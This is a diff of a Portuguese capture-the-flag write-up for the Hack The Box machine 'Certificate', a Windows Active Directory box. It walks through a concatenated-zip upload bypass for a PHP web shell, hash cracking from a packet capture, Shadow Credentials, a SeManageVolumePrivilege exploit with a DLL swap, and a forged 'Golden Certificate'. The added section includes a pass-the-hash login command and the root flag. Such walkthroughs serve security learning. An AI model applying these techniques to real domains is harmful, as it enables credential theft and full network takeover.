@@ -5,13 +5,13 @@ tags: [hackthebox, ctf, activedirectory, fileupload, adcs]
 draft: true
 ---
 
-# Subtítulo da horinha
+# Acesso total com o Certificado Dourado
 
-![[Certificate.png | descrição da imagem]]
+![[Certificate.png | A imagem mostra um certificado com um selo dourado. Abaixo vemos o nome da máquina: Certificate]]
 
 ## Introdução
 
-Olá mundo! Sejam bem vindos à mais uma aventura na minha jornada no mundo da cibersegurança. Hoje vamos falar sobre Certificate, uma máquina classificada como de dificuldade difícil no Hackthebox. 
+Olá mundo! Sejam bem vindos à mais uma aventura na minha jornada no mundo da cibersegurança. Hoje vamos falar sobre `Certificate`, uma máquina classificada como de dificuldade difícil no [Hackthebox](https://www.hackthebox.com). 
 
 Em `Certificate` nós temos um` Windows Active Directory` com um website. Esse website é vulnerável ao ataque `Concatenated Zip File Upload` e, após obter as credenciais da usuária `Sara.B`, conseguimos logar no servidor via `Winrm`. Um arquivo `pcap` é então encontrado na pasta de documentos, onde podemos extrair a hash `krb5pa` do usuário `Lion.SK` e quebrá-la com `John The Ripper`. Usando os privilégios `GenericAll` de `Sara.B`, também podemos obter a `hash NT` do usuário `Ryan.K` por meio de um ataque `Shadow Credentials`. Por fim, conseguimos acesso de administrador depois de explorar os privilégios `SeManageVolumePrivilege` do usuário `Ryan.K`, para ter acesso à Raiz Certificadora ou `Root CA` e forjar um certificado de autenticação falso em nome do usuário `Administrator`.
 
@@ -23,7 +23,7 @@ Dito isso, sem mais demora, vamos começar!
 
 ### Nmap
 
-O resultado do NMAP mostrou que se tratava de um ` Windows Active Directory`. 
+O resultado do [[NMAP]] mostrou que se tratava de um ` Windows Active Directory`. 
 
 ```bash {3}
 PORT STATE SERVICE REASON VERSION 
@@ -72,7 +72,7 @@ Certamente tentei várias técnicas de bypass para subir uma shell `php`, mas tu
 Foi então que passei a pesquisar mais a respeito de técnicas de `file upload` com arquivos `zip` onde poderia bypassar uma shell e encontrei a técnica chamada `Concatenated Zip`.
 
 > [!info] Concatenated ZIP
-> Foi descoberto que certos compressores como `7zip`, podiam abrir arquivos maliciosos enquanto mostrava ao usuário um arquivo comum. A técnica tem esse nome porque nela criamos dois arquivos `zip`: um arquivo` safe.zip` e outro `malicious.zip`. Depois concatenamos os dois arquivos com o comando `cat safe.zip malicious.zip > combined.zip` e geramos um novo arquivo chamado `combined.zip`. Ao descompactar o arquivo `combined.zip` com `7zip`, apenas o arquivo seguro dentro de `safe.zip` é mostrado, mas após a descompactação o arquivo malicioso também estará lá, tendo bypassado as restrições do sistema.
+> Foi descoberto que certos compressores como `7zip`, podiam abrir arquivos maliciosos enquanto mostrava ao usuário um arquivo comum. A técnica tem esse nome porque nela criamos dois arquivos `zip`: um arquivo` safe.zip` e outro `malicious.zip`. Depois concatenamos os dois arquivos com o comando `cat safe.zip malicious.zip > combined.zip` e geramos um novo arquivo chamado `combined.zip`. Ao descompactar o arquivo `combined.zip` com `7zip`, apenas o arquivo seguro dentro de `safe.zip` é mostrado, mas após a descompactação o arquivo malicioso também estará lá, tendo bypassado as restrições do sistema. Mais informações sobre esse tipo de exploração [aqui](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/).
 
 Usando essa técnica criei dois arquivos: Um arquivo `zip` com um `pdf` normal, e outro arquivo `zip` com um diretório chamado shell e minha shell `php` dentro. O diretório é necessário visto que, ao que parece, o arquivo malicioso não é ativado se estiver no diretório padrão do upload. Talvez ele seja apagado por algum script de checagem de arquivos.
 
@@ -133,7 +133,7 @@ The command completed successfully.
 
 Haviam vários usuários nesse domínio, então talvez algum desses estivesse no banco de dados dos cursos online, como professores ou alunos. Verificando o arquivo db.php, encontrei as credenciais `certificate_webapp_user : cert!f!c@teDBPWD`. No entanto não consegui logar no `Mysql` com essas credenciais. Então procurei mais um pouco e encontrei o arquivo `passwords.txt`.
 
-```bash
+```bash title="passwords.txt" 
 c:\xampp>type passwords.txt
 ### XAMPP Default Passwords ###
 
@@ -141,7 +141,7 @@ c:\xampp>type passwords.txt
 
    User: root
    Password:
-   (means no password!)
+   (means no password!) 
    
 <SNIPED>
 ```
@@ -196,10 +196,10 @@ Session completed.
 
 Depois de logar como `Sara.B` com a ferramenta `Evil-Winrm`, logo encontrei dois arquivos interessantes na pasta` \Documents\WS-01`: Um arquivo chamado `Description.txt` e outro chamado `WS-01_PktMon.pcap`. O arquivo `Description.txt` dizia:
 
-```plaintext
+```plaintext title="Description.txt"
 The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
 When a user tries to input bad credentials, it returns bad credentials error.
-But when a user provides valid credentials the file explorer freezes and then crashes!
+But when a user provides valid credentials the file explorer freezes and then crashes! 
 ```
 
 Parecia que um problema com a pasta compartilhada `Reports` estava travando o `file explorer`, mas verificando as pastas compartilhadas com as credenciais de `Sara.B` na ferramenta `Netexec`, não havia nenhuma pasta compartilhada com esse nome. Então fiz o download do arquivo `WS-01_PktMon.pcap` para fazer uma investigação das requisições de rede salvas no arquivo.
@@ -337,11 +337,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
 *Evil-WinRM* PS C:\Users\Ryan.K\Documents>
 ```
 
-Pesquisando sobre `SeManageVolumePrivilege`, descobri que havia um exploit público que abusava desse privilégio. Ele dá a todos os usuários permissões sobre o inteiro disco `C:\`. Após executar o exploit, era só copiar uma DLL maliciosa chamada `Printconfig.dll` para `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`, para substituir o arquivo original. Por fim, era só iniciar o objeto `PrintNotify` e receber a shell reversa como `NT AUTHORITY SYSTEM`. 
+Pesquisando sobre `SeManageVolumePrivilege`, descobri que havia um [exploit público](https://github.com/CsEnox/SeManageVolumeExploit) que abusava desse privilégio. Ele dá a todos os usuários permissões sobre o inteiro disco `C:\`. Após executar o exploit, era só copiar uma **DLL** maliciosa chamada `Printconfig.dll` para `C:\Windows\System32\spool\drivers\x64\3\Printconfig.dll`, para substituir o arquivo original. Por fim, era só iniciar o objeto `PrintNotify` e receber a shell reversa como `NT AUTHORITY SYSTEM`. 
 
 O plano parecia perfeito, mas só parecia. Na realidade, toda tentativa de conexão reversa era bloqueada pelo `Windows Defender` e, a partir daí me lembrei que estava em uma máquina difícil e coisas como simplesmente subir uma shell e rodá-la estava fora de questão. No entanto, nem tudo estava perdido.
 
-Por um momento me lembrei que o nome da máquina é Certificate e que até então, eu não havia explorado nenhuma falha referente a certificados. Então, usando o comando `certutil -Store My`, chequei se havia certificados pessoais usados pelo usuário `Ryan.K`. Felizmente, encontrei a **Raiz Certificadora** , ou `Root CA`, que poderia ser usada para gerar um certificado confiável, que poderia servir de base para forjar um certificado em nome do `Administrator`.
+Por um momento me lembrei que o nome da máquina é **Certificate** e que até então, eu não havia explorado nenhuma falha referente a certificados. Então, usando o comando `certutil -Store My`, chequei se havia certificados pessoais usados pelo usuário `Ryan.K`. Felizmente, encontrei a **Raiz Certificadora** , ou `Root CA`, que poderia ser usada para gerar um certificado confiável, que poderia servir de base para forjar um certificado contendo a chave privada original em nome do `Administrator`.
 
 ```bash {46}
 *Evil-WinRM* PS C:\users\administrator\desktop> c:/temp/SeManageVolumeExploit.exe
@@ -436,7 +436,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Wrote forged certificate and private key to 'golden.pfx'
 ```
 
-Por fim, obtive a `hash NT` do `Administrator` com ataque `Golden Ticket`.
+Por fim, obtive a `hash NT` do `Administrator` com ataque `Golden Certificate`.
 
 ```bash {13}
 ┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
@@ -456,23 +456,53 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 Usando novamente a técnica `Pass-the-hash` com `Evil-Winrm`, consegui me logar como `Administrator` e obter a flag do root.
 
+```bash
+┌──(kali㉿kali)-[~/Boxes/Hackthebox/Hard/Certificate]
+└─$ evil-winrm -i certificate.htb -u 'administrator' -H 'd804304519bf0143c14cbf1c024408c6'
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ../desktop
+
+
+    Directory: C:\Users\Administrator\desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/7/2025   4:29 AM           2675 cert.pfx
+-ar---         6/7/2025  12:28 AM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
+674330e48ebaa48fcbf8acb7790a3659
+```
+
+---
+
 ## Conclusão
 
-![[CertificateFinal.png | descrição da imagem]]
+![[CertificateFinal.png | Mesma imagem do início porém abaixo está escrito: Certificate has been pwned]]
 
-Palavras finais sobre o que aprendeu e CTA.
+Essa máquina me mostrou que existe um abismo entre as máquinas médias e difíceis e que eu preciso estudar bastante coisa ainda. `Windows` certamente não é meu forte, mas depois da sequência de máquinas `Windows AD`, acho que estou começando a gostar de pentest nesse tipo de ambiente.
 
 ```mermaid
 flowchart TD
 	subgraph acesso inicial
     A(Website) -->|concatenated zip file upload| B(xamppuser) 
     B -->|mysql database| C(Sara.B)
-    C -->|arquivo pcap| D(Lion.SK)
+    C -->|krb5pa hash no arquivo pcap| D(Lion.SK)
     D --> E[user.txt]
     end
     subgraph escalação de privilegios
     C -->|shadow credentials| F(Ryan.K)
     F -->|SeManageVolumeAbuse.exe| G[Privilégios Elevados]
-    G -->|golden ticket| H[root.txt]
+    G -->|golden Certificate| H[root.txt]
     end
 ```
